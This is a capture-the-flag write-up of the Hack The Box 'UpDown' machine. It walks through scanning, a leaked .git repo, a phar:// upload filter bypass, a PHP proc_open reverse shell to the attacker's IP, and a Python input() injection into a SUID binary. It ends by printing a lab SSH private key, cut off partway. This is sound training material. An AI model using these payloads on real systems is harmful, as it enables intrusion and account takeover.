---
{"dg-publish":true,"permalink":"/ct-fs/htb/up-down/","dg-note-properties":{}}
---

A linux ctf from hackthebox
#php #codereview #deserialization #PHAR
# by: 0xCapra_Daemon aka Will Keller


## Contents:
[[CTFs/HTB/UpDown#Phase 1 Recon\|#Phase 1 Recon]]
[[CTFs/HTB/UpDown#Phase 2 exploit\|#Phase 2 exploit]]
[[CTFs/HTB/UpDown#Takeaways\|#Takeaways]]

## Phase 1: Recon
![Pasted image 20260713122201.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713122201.png)

```zsh
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.129.227.227
------------------------------------------------------------
Scanning target 10.129.227.227
Time started: 2026-07-13 15:23:32.988422
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port scan completed in 0:00:33.482852
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.227.227 10.129.227.227
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1


```
I always start by plugging our target IP into [Threader3000](https://github.com/dievus/threader3000). This allows us to quickly ID which ports we need to focus on scanning in Nmap. It also has a nice built-in feature prebuilding the nmap scan syntax for the identified ports and run it all within script outputting to a folder named after the target IP address.


```zsh
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.227.227 10.129.227.227
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 15:25 -0400
Nmap scan report for 10.129.227.227
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
----------------------------------------
```
Our subsequent Nmap scan reveals open SSH and an Apache2 server running on our target.


```zsh
┌──(kali㉿kali)-[~/CTF/HTB/updown]
└─$ curl -v http://$IP
*   Trying 10.129.227.227:80...
* Established connection to 10.129.227.227 (10.129.227.227 port 80) from 10.10.14.192 port 47754 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.129.227.227
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Mon, 13 Jul 2026 19:29:43 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 1131
< Content-Type: text/html; charset=UTF-8
< 
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ?</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">Here you can check if your website is up or down.</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="POST">
			<label>Website to check:</label><br><br>
			<input type="text" name="site" value="" placeholder="http://google.com">
			<input type="checkbox" id="debug" name="debug" value="1">
			<label for="debug"> Debug mode  (On/Off) </label><br>
			<input type="submit" value="Check">
		</form>

      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb</p><br>
      </footer>
    </div>

  </body>
* Connection #0 to host 10.129.227.227:80 left intact
</html>
```
An initial cURL to the target reveals an "Is my Website Up?" site with form we can POST to with different URLs to check if they are "up" according to some app logic we may discover later. Also worth noting they have an official Domain Name for this site under "siteisup.htb" which I will add to my /etc/hosts file. This will allow us to enumerate possible vhosts.


![Pasted image 20260713123256.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713123256.png)
**Ignore the previous entries from other challenges**

![Pasted image 20260713123513.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713123513.png)
First looks at it in the browser confirm what our cURL showed us earlier. I'm also noting the "debug" switch here as it may be something we can abuse in exploitation later on.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/updown/scanning]
└─$ gobuster dir -u http://siteisup.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,html,txt,css,js,zip,pdf,py,bak,7z,gz,tar,targz -t 15 --exclude-length 277 | tee ./gobuster_80
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] Exclude Length:          277
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,pdf,bak,7z,tar,txt,css,js,zip,py,gz,targz,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 1131]
dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]
.                    (Status: 200) [Size: 1131]
stylesheet.css       (Status: 200) [Size: 5531]

```
I fire off a gobuster scan looking for interesting subdirectories and find a subdir that redirects to a "/dev/" endpoint. 

![Pasted image 20260713130009.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713130009.png)
Looking at it in the browser doesn't seem to show any rendering from a GET request. This may be an endpoint we come back to later for a POST request and/or may show something new when we have an authenticated session.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/updown/scanning]
└─$ gobuster vhost -u http://siteisup.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -ad --xs 400,404
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://siteisup.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
dev.siteisup.htb Status: 403 [Size: 281]
DEV.siteisup.htb Status: 403 [Size: 281]
Dev.siteisup.htb Status: 403 [Size: 281]
Progress: 43007 / 43007 (100.00%)
===============================================================
Finished
===============================================================
```

![Pasted image 20260713131351.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713131351.png)
VHost enumeration reveals a "dev.siteisup.htb" vhost but returns a 403 *forbidden* and confirmed visiting in the browser. Could be useful if we find a way to authenticate directly to the server.

## Phase 2: exploit

So far from our recon, I've determined that our best attack vector currently is the website checker function itself for possible LFI/Upload Vulns/RCE capabilities.

![Pasted image 20260713131646.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713131646.png)
Manual entry of the target site into the function reveals a simple "is up" message.

![Pasted image 20260713131759.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713131759.png)
![Pasted image 20260713131959.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713131959.png)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/updown/scanning]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.227.227 - - [13/Jul/2026 16:19:40] "GET / HTTP/1.1" 200 -

```
Validated the up and down function by entering my attacker IP into the machine without an http server running and then one with a server running. My python server even validated the request actually reaching the intended address.

![Pasted image 20260713132120.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713132120.png)
I used the "debug" switch and the response revealed that the internal server appears to be using cURL as it's "UpDown" functionality based on the sytnax of the "debugged" response.

![Pasted image 20260713132243.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713132243.png)
The 'debug' response block is able to be expanded via click-and-drag and validates my suspicion that this is indeed using cURL to operate. This may mean we can read files within the system directory and/or upload our own files to the web directory.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/updown/scanning]
└─$ cat test.txt      
hello world
-----------------------

┌──(kali㉿kali)-[~/CTF/HTB/updown/scanning]
└─$ sudo python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.227.227 - - [13/Jul/2026 16:24:45] "GET /test.txt HTTP/1.1" 200 -
10.129.227.227 - - [13/Jul/2026 16:24:53] "GET /test.txt HTTP/1.1" 200 -


```
![Pasted image 20260713132514.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713132514.png)
I created a file called 'test.txt' containing "hello world" to see, if I sent over the request to a specific file, would it render it and it did. With this in mind, I'm going to see if we can upload a file to the server with `cURL http://<attacker IP>/revshell.php -o ./revshell.php`

![Pasted image 20260713133414.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713133414.png)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/updown/exploit]
└─$ nc -lnvp 8888
listening on [any] 8888 ...
```
I copied the php reverse shell script from `/usr/share/webshells/PHP/php-reverse-shell.php` into our attacker folder that we will stand up with a simple http server in python. I also changed the `$ip` and `$port` variables in the script to lineup with the subsequent `netcat` listener we have setup in a separate tab.

![Pasted image 20260713133829.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713133829.png)
As you can see, our initial attempt to upload the file with `cURl` flags was blocked by the app. This means it looks like there are input filters in place for the UI version of this web app. We may need to breakout Burpsuite to see if the server is blocking it browser and/or serverside.

![Pasted image 20260713134026.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713134026.png)
I also did some manual validation to see if the request was blocked from the php file we were calling or if it was due to the output flags and it indeed was the output flag.

![Pasted image 20260713141619.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713141619.png)
Manual testing of mangling the `site` parameter in Burp proved to still block us even when obfuscating payloads with quotes and base64. Seemingly everything I tried to use to obfuscate the command wasn't working. Additionally the server didn't care what I input for the `debug` parameter, but it did not appear to execute server side as none of the commands I input there rendered or called back to our server. Once a "hacking attempt" was detected by the filter, it immediately dropped the request. This sort of validates that it's server-side filtering taking place.

![Pasted image 20260713141952.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713141952.png)
![Pasted image 20260713142252.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713142252.png)
Also decided to check for SSTI vulns both in the paramter directly and in a file containing the polyglot but was not rendered as you can see. However this gives me an idea to embed commands in the files we can render from our http server.

![Pasted image 20260713142534.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713142534.png)
![Pasted image 20260713142729.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713142729.png)
Created a `command.txt` file in our web directory containing an embedded `cURL` command to reference our previously created `test.txt` file. However, the target only called to the `command.txt` file and simply rendered the contents on screen without executing them.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/updown/scanning]
└─$ gobuster dir -u http://siteisup.htb/dev/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,html,txt,js,css,jpg,png,pdf,zip -t 15 --exclude-length 277 | tee ./gobuster_dev
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb/dev/
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] Exclude Length:          277
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,png,js,css,jpg,pdf,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 0]
.                    (Status: 200) [Size: 0]
.git                 (Status: 301) [Size: 315] [--> http://siteisup.htb/dev/.git/]
```
#Phase1 Spinning my wheels on the parameter issue I decided to go back to enumeration of the `/dev` endpoint we previously got a 403 *forbidden* response for and discover an exposed Git repo.

```zsh
┌──(kali㉿kali)-[~/…/HTB/updown/exploit/.git]
└─$ ls
total 40K
4.0K drwxrwxr-x 3 kali kali 4.0K Jul 13 17:56 .
4.0K drwxrwxr-x 4 kali kali 4.0K Jul 13 17:56 ..
4.0K -rw-rw-r-- 1 kali kali   59 Jul 13 17:56 admin.php
4.0K -rw-rw-r-- 1 kali kali  147 Jul 13 17:56 changelog.txt
4.0K -rw-rw-r-- 1 kali kali 3.1K Jul 13 17:56 checker.php
4.0K drwxrwxr-x 7 kali kali 4.0K Jul 13 18:06 .git
4.0K -rw-rw-r-- 1 kali kali  117 Jul 13 17:56 .htaccess
4.0K -rw-rw-r-- 1 kali kali  273 Jul 13 17:56 index.php
8.0K -rw-rw-r-- 1 kali kali 5.5K Jul 13 17:56 stylesheet.css

```
Pulled repo locally to our machine with [Git-Dumper](https://github.com/arthaud/git-dumper) 

```zsh
if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
```
Reading out the contents of `checker.php` reveals the source code for target web app. However, there are some functions that seem to be missing from our version on the web. This makes me think this source code belongs to the `dev.siteisup.htb` virtual host we discovered earlier.

```zsh
┌──(kali㉿kali)-[~/…/HTB/updown/exploit/.git]
└─$ cat admin.php  
<?php
if(DIRECTACCESS){
	die("Access Denied");
}

#ToDo
?
```
Contents of the `admin.php` file in the same repo suggests this is the php that is governing the `dev` vhost since this is what we received when trying to access it directly in the browser and in Burp.

```zsh
┌──(kali㉿kali)-[~/…/HTB/updown/exploit/.git]
└─$ cat .htaccess 
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Heade
```
Finally reading the contents of `.htaccess` in that repo show us a secret developer header in use for this endpoint.

![Pasted image 20260713152031.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713152031.png)
Attempting to access this vhost directly acts as expected and gives us a 403 *forbidden* response.

![Pasted image 20260713152144.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713152144.png)
![Pasted image 20260713152717.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713152717.png)
Adding the header outlined in `.htaccess` to our request does indeed give us access to the `dev` vhost.

```zsh
└─$ gobuster dir -u http://dev.siteisup.htb/ -H "Special-Dev: only4dev" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,html,js,css,txt,sh,zip,bak,pdf,png,jpg -t 15 --exclude-length 281 | tee ./gobuster_vhost_dev
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.siteisup.htb/
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] Exclude Length:          281
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              bak,png,jpg,php,html,zip,pdf,js,css,txt,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin.php            (Status: 200) [Size: 0]
index.php            (Status: 200) [Size: 1220]
uploads              (Status: 301) [Size: 322] [--> http://dev.siteisup.htb/uploads/]
.                    (Status: 200) [Size: 1220]
stylesheet.css       (Status: 200) [Size: 5531]
```
Gobuster enum with the dev header attached reveals `uploads/` subdirectory in the `dev` vhost.

![Pasted image 20260713154644.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713154644.png)
Its contents reveal folders named with md5 hashes of the exact time of any valid submission we uploaded to the `dev` vhost index page. This may become useful if we can bypass the extension filter to upload a reverse shell.

![Pasted image 20260713154909.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260713154909.png)
I attempted to bypass the input filter by changing the file extension to our `revshell.php` to `revshell.php.jpg`. The system accepted this, however, it parses each line for a URL to check with it's nested check function. this gives me the idea to nest our previous `curl -o` attempt in a valid text file and see if we can force the app's nested function to download a shell.

```zsh
┌──(kali㉿kali)-[~/…/HTB/updown/exploit/www]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.227.227 - - [13/Jul/2026 18:52:21] code 400, message Bad request syntax ('GET /revshell.php -o revshell.php HTTP/1.1')
10.129.227.227 - - [13/Jul/2026 18:52:21] "GET /revshell.php -o revshell.php HTTP/1.1" 400 -
```
Initial attempts show the app doesn't parse flags from within the submitted file. However it will parse an attacker controlled endpoint. We may be able to get execution still.

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>

```
```php
if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
```
In the source code for `index.php` in the `dev` vhost domain we see they've used a dangerous `include()` function, but limits the input parameter to `page`. if that parameter is not included then it loads `checker.php` which is the main functionality of the file upload section of that vhost. It filters most php file extensions except it doesn't block phar wrapping.

```bash
┌──(kali㉿kali)-[~/CTF/HTB/updown/exploit]
└─$ echo "<?php phpinfo(); ?>" > info.php

┌──(kali㉿kali)-[~/CTF/HTB/updown/exploit]
└─$ zip info.zip info.php

┌──(kali㉿kali)-[~/CTF/HTB/updown/exploit]
└─$ mv info.zip info.txt
```
we then create a php file with a phpinfo call embeded and zip it to a zip archive so the `phar://` wrapper will correctly read it. Finally we rename it `info.txt` since zip files are filtered.


![Pasted image 20260714122605.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260714122605.png)
We upload the info.txt file successfully and navigate to `http://dev.siteisup.htb/uploads/` , where we can find a directory which presumably hosts our payload. 


This is where we use the phar:// wrapper and trigger our payload by navigating to `http://dev.siteisup.htb/? page=phar://uploads/9bb9ea0d84f60381a55f40d57d9f5088/info.txt/info` to read out `PHPInfo()`

![Pasted image 20260714123555.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260714123555.png)
Found github repo online to read `phpinfo` for potentially malicious functions that may lead to RCE. https://github.com/teambi0s/dfunc-bypasser

![Pasted image 20260714123724.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260714123724.png)
We have to add our dev header into the script so it can have proper access to the phpinfo call we just uploaded.

```zsh
┌──(kali㉿kali)-[~/…/HTB/updown/exploit/dfunc-bypasser]
└─$ python2 dfunc-bypasser.py --url 'http://dev.siteisup.htb/?page=phar://uploads/2ccb7e1f96f5198b837d07796b97be25/info.txt/info'


                                ,---,     
                                  .'  .' `\   
                                  ,---.'     \  
                                  |   |  .`\  | 
                                  :   : |  '  | 
                                  |   ' '  ;  : 
                                  '   | ;  .  | 
                                  |   | :  |  ' 
                                  '   : | /  ;  
                                  |   | '` ,/   
                                  ;   :  .'     
                                  |   ,.'       
                                  '---'         


			authors: __c3rb3ru5__, $_SpyD3r_$


Please add the following functions in your disable_functions option: 
proc_open
If PHP-FPM is there stream_socket_sendto,stream_socket_client,fsockopen can also be used to be exploit by poisoning the request to the unix socket

```
from our output we can see that `proc_open` is flagged as potentially malicious and *should* be disabled from input, but it's not.

```php
<?php
array('pipe', 'r'), //stdin 
1 => array('pipe', 'w'), // stdout 
2 => array('pipe', 'a') // stderr 
); 
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.192/8888 0>&1'"; $process = proc_open($cmd, $descriptorspec, $pipes, null, null); ?>
```
 Since `proc_open()` function is not blocked by the application we can abuse this when writing a PHP reverse shell. However we can't use the famous long version as the file size restriction that's in place in `checker.php`

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/updown/exploit]
└─$ zip proc.zip proc.php
  adding: proc.php (deflated 60%)
                                                                       
┌──(kali㉿kali)-[~/CTF/HTB/updown/exploit]
└─$ mv proc.zip proc.txt
```
Just like before we have to make it into a zip archive so we can abuse the phar wrapper exploit and then we must change the name to `proc.txt` so the input filter will accept it.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/updown/exploit]
└─$ nc -lnvp 8888   
listening on [any] 8888 ...
connect to [10.10.14.192] from (UNKNOWN) [10.129.227.227] 58334
bash: cannot set terminal process group (896): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev$
```
uploading and accessing our file the same way we did with `phpinfo` allows us to catch a reverse shell session back to our machine's netcat listener.

```zsh
www-data@updown:/var/www/dev$ ls
total 36K
4.0K drwxr-xr-x 3 www-data www-data 4.0K Jun 22  2022 .
4.0K drwxr-xr-x 4 www-data www-data 4.0K Jun 22  2022 ..
4.0K -rw-r--r-- 1 www-data www-data  115 Oct 20  2021 .htaccess
4.0K -rw-r--r-- 1 www-data www-data   24 Oct 20  2021 admin.php
4.0K -rw-r--r-- 1 www-data www-data 3.1K Oct 20  2021 checker.php
4.0K -rw-r--r-- 1 www-data www-data  273 Oct 20  2021 index.php
8.0K -rw-r--r-- 1 www-data www-data 5.5K Oct 20  2021 stylesheet.css
4.0K drwxr-xr-x 3 www-data www-data 4.0K Jul 14 20:05 uploads
www-data@updown:/var/www/dev$ id; uname -a
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux updown 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
A little initial recon reveals we are the user `www-data` and have landed in the directory hosting the `dev` vhost app.

```zsh
www-data@updown:/var$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/home/developer/dev/siteisup
```
Preliminary enumeration of SUID permission binaries on the machine reveal a homemade binary `/home/developer/dev/siteisup`. this may be something we can use to move laterally.

```zsh
www-data@updown:/home/developer/dev$ ls
total 32K
4.0K drwxr-x--- 2 developer www-data  4.0K Jun 22  2022 .
4.0K drwxr-xr-x 6 developer developer 4.0K Aug 30  2022 ..
 20K -rwsr-x--- 1 developer www-data   17K Jun 22  2022 siteisup
4.0K -rwxr-x--- 1 developer www-data   154 Jun 22  2022 siteisup_test.py
www-data@updown:/home/developer/dev$ cat siteisup_test.py 
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"www-data@updown:/home/developer/dev$
```
digging deeper we see the binary and a script that is presumably the source for this compiled version of the binary. it's uses python's `request` library to make a simple get request to a user supplied URL by using the `input()` function. This function is notoriously unsafe and can be used in a similar manner to `eval()` in that it can make arbitrary executions.

```zsh
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('/bin/bash')
developer@updown:/home/developer/dev$ 
```
We call out to the binary and inject our own mini python script calling `/bin/bash` to execute a shell within the context of the `siteisup` binary's process, retaining the sticky permissions of its creator which is the user `developer`.

```zsh
developer@updown:/home/developer/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
